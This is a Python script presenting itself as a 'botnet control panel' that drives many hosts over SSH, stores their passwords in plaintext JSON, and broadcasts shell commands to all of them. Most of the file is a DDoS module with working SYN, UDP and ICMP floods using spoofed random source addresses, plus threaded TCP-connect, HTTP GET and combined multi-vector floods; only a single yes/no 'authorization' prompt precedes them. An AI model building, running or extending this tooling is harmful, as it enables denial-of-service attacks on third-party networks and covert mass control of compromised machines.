import sys
import os
import json
import shlex
import threading
import time
import random
import socket
from colorama import Fore, init
from pexpect import pxssh
from scapy.all import *

init(autoreset=True)

os.system('clear')

# Function to display menu
def display_menu():
    print(Fore.GREEN + "1. List Bots")
    print(Fore.GREEN + "2. Run Command")
    print(Fore.GREEN + "3. Bash")
    print(Fore.GREEN + "4. Add Bot")
    print(Fore.GREEN + "5. DDOS")
    print(Fore.RED + "6. Exit")

# Connect to SSH server
def connect_ssh(host, port, user, password):
    try:
        s = pxssh.pxssh()
        s.login(host, user, password, port=int(port))
        return s
    except Exception as e:
        print(Fore.RED + f"[!] Error connecting to {host}: {str(e)}")
        return None

# Sending a command to execute
def send_command(session, cmd):
    try:
        session.sendline(cmd)
        session.prompt(timeout=10)  # Add timeout
        return session.before
    except Exception as e:
        print(Fore.RED + f"[!] Error executing command: {str(e)}")
        return b"Command execution failed"

# Running through the loop to traverse the complete clients
def botnet_command(command):
    if not botnet:
        print(Fore.RED + "[!] Error: No bots available.")
        return
    
    for client in botnet:
        if 'session' in client and client['session']:
            try:
                session = client['session']
                output = send_command(session, command)
                print(f"[+] Output from {client['host']}:")
                print("<<< " + output.decode('utf-8', errors='ignore'))
            except Exception as e:
                print(Fore.RED + f"[!] Error with bot {client['host']}: {str(e)}")
        else:
            print(Fore.RED + f"[!] Error: No session found for {client['host']}")

# Adding new clients to botnet
def add_client(host, port, user, password):
    session = connect_ssh(host, port, user, password)
    if session:
        client_info = {'host': host, 'port': port, 'user': user, 'password': password, 'session': session}
        botnet.append(client_info)
        print(Fore.GREEN + "[+] Bot added successfully.")
        return True
    else:
        print(Fore.RED + "[!] Failed to add bot. The bot will not be added to the botnet list.")
        return False

# Input command to run
def ask_for_command():
    while True:
        if not botnet:
            print(Fore.RED + "[!] Error: No bots available.")
            return
        
        run = input(Fore.GREEN + "Enter a command to run (or type 'exit' to return to menu): ")
        if run.lower() == 'exit':
            break
        
        if run.strip():  # Only execute if command is not empty
            botnet_command(run)

# Input command to run in bash
def bash():
    print(Fore.YELLOW + "[*] Entering bash mode. Type 'exit' to return to main menu.")
    
    while True:
        if not botnet:
            print(Fore.RED + "[!] Error: No bots available.")
            return
        
        bash_command = input("bash>>> ")
        
        if bash_command.lower() == 'exit':
            break
            
        if not bash_command.strip():  # Skip empty commands
            continue
        
        # Safely escape the command to prevent injection
        safe_command = shlex.quote(bash_command)
        
        for client in botnet:
            if 'session' in client and client['session']:
                try:
                    session = client['session']
                    output = send_command(session, bash_command)  # Execute directly, not through echo
                    print(f"[+] Output from {client['host']}:")
                    print("<<< " + output.decode('utf-8', errors='ignore'))
                except Exception as e:
                    print(Fore.RED + f"[!] Error with bot {client['host']}: {str(e)}")
            else:
                print(Fore.RED + f"[!] Error: No session found for {client['host']}")

# DDOS function with proper controls

def ddos_attack():
    try:
        print(Fore.CYAN + "\n" + "="*50)
        print(Fore.CYAN + "    DDOS ATTACK MODULE")
        print(Fore.CYAN + "="*50)
        
        target_IP = input("Enter target IP address: ").strip()
        if not target_IP:
            print(Fore.RED + "[!] Invalid IP address.")
            return
            
        target_port = input("Enter target port (default 80): ").strip()
        if not target_port:
            target_port = 80
        else:
            target_port = int(target_port)
            
        print(Fore.YELLOW + "\nSelect Attack Type:")
        print("1. SYN Flood (Current)")
        print("2. UDP Flood")
        print("3. ICMP Flood")
        print("4. TCP Connect Flood")
        print("5. HTTP GET Flood")
        print("6. Multi-vector Attack")
        
        attack_type = input("Choose attack type (1-6): ").strip()
        
        packet_count = input("Enter number of packets/connections (default 100): ").strip()
        if not packet_count:
            packet_count = 100
        else:
            packet_count = int(packet_count)
            
        if packet_count > 1000:
            confirm = input(f"You're about to send {packet_count} packets. Continue? (y/N): ")
            if confirm.lower() != 'y':
                print(Fore.YELLOW + "[*] Attack cancelled.")
                return
        
        # Execute based on attack type
        if attack_type == "1":
            syn_flood_attack(target_IP, target_port, packet_count)
        elif attack_type == "2":
            udp_flood_attack(target_IP, target_port, packet_count)
        elif attack_type == "3":
            icmp_flood_attack(target_IP, packet_count)
        elif attack_type == "4":
            tcp_connect_flood(target_IP, target_port, packet_count)
        elif attack_type == "5":
            http_get_flood(target_IP, target_port, packet_count)
        elif attack_type == "6":
            multi_vector_attack(target_IP, target_port, packet_count)
        else:
            print(Fore.RED + "[!] Invalid attack type.")
            
    except ValueError:
        print(Fore.RED + "[!] Invalid input. Please enter valid numbers.")
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[*] Attack interrupted by user.")
    except Exception as e:
        print(Fore.RED + f"[!] Error during attack: {str(e)}")

def syn_flood_attack(target_ip, target_port, packet_count):
    """Enhanced SYN flood with better packet crafting"""
    try:
        print(Fore.YELLOW + f"[*] Starting SYN flood attack on {target_ip}:{target_port}")
        print(Fore.YELLOW + f"[*] Sending {packet_count} SYN packets...")
        
        packets = []
        for i in range(packet_count):
            # Randomize source IP and port
            src_ip = f"{random.randint(1,223)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
            src_port = random.randint(1024, 65535)
            sequence = random.randint(1000, 4294967295)
            
            # Create SYN packet
            ip = IP(src=src_ip, dst=target_ip)
            tcp = TCP(sport=src_port, dport=target_port, flags="S", seq=sequence)
            packet = ip / tcp
            packets.append(packet)
        
        # Send all packets (suppress warnings)
        send(packets, verbose=0)
        print(Fore.GREEN + f"[+] SYN flood completed! Sent {packet_count} packets.")
        
    except Exception as e:
        print(Fore.RED + f"[!] SYN flood error: {str(e)}")

def udp_flood_attack(target_ip, target_port, packet_count):
    """UDP flood attack"""
    try:
        print(Fore.YELLOW + f"[*] Starting UDP flood on {target_ip}:{target_port}")
        
        packets = []
        for i in range(packet_count):
            src_ip = f"{random.randint(1,223)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
            src_port = random.randint(1024, 65535)
            
            # Create UDP packet with random payload
            payload_size = random.randint(64, 1024)
            payload = Raw(b"X" * payload_size)
            
            ip = IP(src=src_ip, dst=target_ip)
            udp = UDP(sport=src_port, dport=target_port)
            packet = ip / udp / payload
            packets.append(packet)
        
        send(packets, verbose=0)
        print(Fore.GREEN + f"[+] UDP flood completed! Sent {packet_count} packets.")
        
    except Exception as e:
        print(Fore.RED + f"[!] UDP flood error: {str(e)}")

def icmp_flood_attack(target_ip, packet_count):
    """ICMP flood attack"""
    try:
        print(Fore.YELLOW + f"[*] Starting ICMP flood on {target_ip}")
        
        packets = []
        for i in range(packet_count):
            src_ip = f"{random.randint(1,223)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
            
            # Create ICMP packet
            ip = IP(src=src_ip, dst=target_ip)
            icmp = ICMP(type=8, code=0)  # Echo request
            payload = Raw(b"X" * 56)  # Standard ping payload size
            packet = ip / icmp / payload
            packets.append(packet)
        
        send(packets, verbose=0)
        print(Fore.GREEN + f"[+] ICMP flood completed! Sent {packet_count} packets.")
        
    except Exception as e:
        print(Fore.RED + f"[!] ICMP flood error: {str(e)}")

def tcp_connect_flood(target_ip, target_port, connections):
    """TCP connection flood (doesn't require root)"""
    try:
        print(Fore.YELLOW + f"[*] Starting TCP connect flood on {target_ip}:{target_port}")
        
        def make_connection(target_ip, target_port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((target_ip, target_port))
                time.sleep(0.1)  # Hold connection briefly
                sock.close()
            except:
                pass
        
        # Create threads for concurrent connections
        threads = []
        for i in range(connections):
            thread = threading.Thread(target=make_connection, args=(target_ip, target_port))
            threads.append(thread)
            thread.start()
            
            if (i + 1) % 50 == 0:
                print(f"[*] Started {i + 1}/{connections} connections...")
        
        # Wait for completion
        for thread in threads:
            thread.join(timeout=2)
            
        print(Fore.GREEN + f"[+] TCP connect flood completed! Attempted {connections} connections.")
        
    except Exception as e:
        print(Fore.RED + f"[!] TCP connect flood error: {str(e)}")

def http_get_flood(target_ip, target_port, requests):
    """HTTP GET flood attack"""
    try:
        print(Fore.YELLOW + f"[*] Starting HTTP GET flood on {target_ip}:{target_port}")
        
        def send_http_request(target_ip, target_port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((target_ip, target_port))
                
                # Send HTTP GET request
                request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n"
                sock.send(request.encode())
                sock.recv(1024)  # Receive response
                sock.close()
            except:
                pass
        
        threads = []
        for i in range(requests):
            thread = threading.Thread(target=send_http_request, args=(target_ip, target_port))
            threads.append(thread)
            thread.start()
            
            if (i + 1) % 25 == 0:
                print(f"[*] Sent {i + 1}/{requests} HTTP requests...")
        
        for thread in threads:
            thread.join(timeout=3)
            
        print(Fore.GREEN + f"[+] HTTP GET flood completed! Sent {requests} requests.")
        
    except Exception as e:
        print(Fore.RED + f"[!] HTTP GET flood error: {str(e)}")

def multi_vector_attack(target_ip, target_port, intensity):
    """Combines multiple attack vectors"""
    try:
        print(Fore.YELLOW + f"[*] Starting multi-vector attack on {target_ip}:{target_port}")
        print(Fore.YELLOW + "[*] Launching SYN, UDP, and ICMP floods simultaneously...")
        
        # Launch attacks in parallel
        syn_thread = threading.Thread(target=syn_flood_attack, args=(target_ip, target_port, intensity//3))
        udp_thread = threading.Thread(target=udp_flood_attack, args=(target_ip, target_port, intensity//3))
        icmp_thread = threading.Thread(target=icmp_flood_attack, args=(target_ip, intensity//3))
        
        syn_thread.start()
        udp_thread.start()
        icmp_thread.start()
        
        syn_thread.join()
        udp_thread.join()
        icmp_thread.join()
        
        print(Fore.GREEN + "[+] Multi-vector attack completed!")
        
    except Exception as e:
        print(Fore.RED + f"[!] Multi-vector attack error: {str(e)}")
# Save botnet to a file
def save_botnet():
    try:
        botnet_data = []
        for client in botnet:
            botnet_data.append({
                'host': client['host'], 
                'port': client['port'], 
                'user': client['user'], 
                'password': client['password']
            })
        
        with open('botnet.json', 'w') as f:
            json.dump(botnet_data, f, indent=2)
        print(Fore.GREEN + "[+] Botnet configuration saved.")
    except Exception as e:
        print(Fore.RED + f"[!] Error saving botnet: {str(e)}")

# Load botnet from a file
def load_botnet():
    global botnet
    botnet = []
    
    try:
        if not os.path.exists('botnet.json'):
            print(Fore.YELLOW + "[*] No saved botnet configuration found.")
            return
            
        with open('botnet.json', 'r') as f:
            botnet_data = json.load(f)
        
        print(Fore.YELLOW + "[*] Loading saved botnet configuration...")
        
        # Reconnect sessions for each bot
        for client_data in botnet_data:
            print(f"[*] Attempting to reconnect to {client_data['host']}...")
            session = connect_ssh(
                client_data['host'], 
                client_data['port'], 
                client_data['user'], 
                client_data['password']
            )
            
            if session:
                client_data['session'] = session
                botnet.append(client_data)
                print(Fore.GREEN + f"[+] Reconnected to bot {client_data['host']}")
            else:
                print(Fore.RED + f"[!] Failed to reconnect to bot {client_data['host']}.")
                
    except json.JSONDecodeError:
        print(Fore.RED + "[!] Error: Invalid botnet configuration file.")
        botnet = []
    except Exception as e:
        print(Fore.RED + f"[!] Error loading botnet: {str(e)}")
        botnet = []

# Cleanup function to close SSH sessions
def cleanup_sessions():
    for client in botnet:
        if 'session' in client and client['session']:
            try:
                client['session'].logout()
            except:
                pass

# Main execution
if __name__ == "__main__":
    botnet = []
    
    print(Fore.CYAN + "="*50)
    print(Fore.CYAN + "    BOTNET CONTROL PANEL")
    print(Fore.CYAN + "="*50)
    
    load_botnet()
    
    try:
        while True:
            print("")
            display_menu()
            option = input(Fore.YELLOW + "Enter any option: ").strip()
            
            if option == '1':
                if botnet:
                    print(Fore.CYAN + f"\n[*] Connected Bots ({len(botnet)}):")
                    for i, client in enumerate(botnet, 1):
                        status = "Connected" if 'session' in client and client['session'] else "Disconnected"
                        print(f"{i}. {client['host']}:{client['port']} ({client['user']}) - {status}")
                else:
                    print(Fore.RED + "[!] Botnet is empty.")
                    
            elif option == '2':
                ask_for_command()
                
            elif option == '3':
                bash()
                
            elif option == '4':
                print(Fore.YELLOW + "\n[*] Adding new bot...")
                host = input("Enter the bot's IP address: ").strip()
                if not host:
                    print(Fore.RED + "[!] IP address cannot be empty.")
                    continue
                    
                port = input("Enter the bot's SSH port number (default 22): ").strip()
                if not port:
                    port = "22"
                    
                user = input("Enter the bot's username: ").strip()
                if not user:
                    print(Fore.RED + "[!] Username cannot be empty.")
                    continue
                    
                password = input("Enter the bot's password: ").strip()
                if not password:
                    print(Fore.RED + "[!] Password cannot be empty.")
                    continue
                
                if add_client(host, port, user, password):
                    save_botnet()
                    
            elif option == '5':
                print(Fore.YELLOW + "\n[*] DDOS Attack Module")
                print(Fore.RED + "[!] WARNING: Only use on authorized targets!")
                confirm = input("Do you have authorization to test this target? (y/N): ")
                if confirm.lower() == 'y':
                    ddos_attack()
                else:
                    print(Fore.YELLOW + "[*] DDOS attack cancelled.")
                    
            elif option == '6':
                print(Fore.YELLOW + "[*] Saving configuration and exiting...")
                save_botnet()
                cleanup_sessions()
                print(Fore.GREEN + "[+] Goodbye!")
                sys.exit(0)
                
            else:
                print(Fore.RED + "[!] Invalid option. Please choose a valid option (1-6).")
                
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[*] Interrupted by user. Cleaning up...")
        save_botnet()
        cleanup_sessions()
        sys.exit(0)
    except Exception as e:
        print(Fore.RED + f"[!] Unexpected error: {str(e)}")
        cleanup_sessions()
        sys.exit(1)
